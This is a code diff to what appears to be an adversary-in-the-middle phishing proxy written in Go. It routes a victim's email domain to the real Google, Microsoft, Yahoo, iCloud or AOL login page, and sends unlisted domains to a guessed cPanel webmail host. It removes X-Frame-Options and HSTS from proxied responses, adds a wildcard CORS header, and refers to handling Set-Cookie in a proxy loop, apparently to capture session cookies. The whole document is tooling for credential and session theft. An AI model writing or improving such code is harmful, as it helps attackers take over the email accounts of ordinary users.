@@ -11,6 +11,7 @@ var ProviderMapping = map[string]string{
 	"google.com":     "https://accounts.google.com/",
 	"outlook.com":    "https://login.live.com/",
 	"hotmail.com":    "https://login.live.com/",
+	"live.com":       "https://login.live.com/",
 	"yahoo.com":      "https://login.yahoo.com/",
 	"icloud.com":     "https://appleid.apple.com/",
 	"aol.com":        "https://login.aol.com/",
@@ -35,20 +36,18 @@ func GetTargetDomain(email string) string {
 	if len(parts) < 2 {
 		return "https://accounts.google.com/" // Default fallback
 	}
-	domain := parts[1]
+	domain := strings.ToLower(parts[1])
 	if target, ok := ProviderMapping[domain]; ok {
 		return target
 	}
-	// Fallback: assume it's a standard webmail
-	return "https://" + domain + "/"
+	// Fallback: assume it's a standard webmail (good for cPanel / custom domains)
+	return "https://webmail." + domain + "/"
 }
 
 // CloneHeaders copies critical headers from the upstream response to the client
 func CloneHeaders(src *http.Response, dst http.ResponseWriter) {
-	dst.Header().Set("Server", src.Header.Get("Server"))
-	dst.Header().Set("Cache-Control", src.Header.Get("Cache-Control"))
 	dst.Header().Set("Content-Type", src.Header.Get("Content-Type"))
-	dst.Header().Set("X-Frame-Options", src.Header.Get("X-Frame-Options"))
-	dst.Header().Set("Strict-Transport-Security", src.Header.Get("Strict-Transport-Security"))
-	// Note: Set-Cookie is handled separately in the proxy logic
+	dst.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
+	dst.Header().Set("Access-Control-Allow-Origin", "*") // Allows JS to load resources
+	// Note: Set-Cookie is handled in the proxy loop
 }
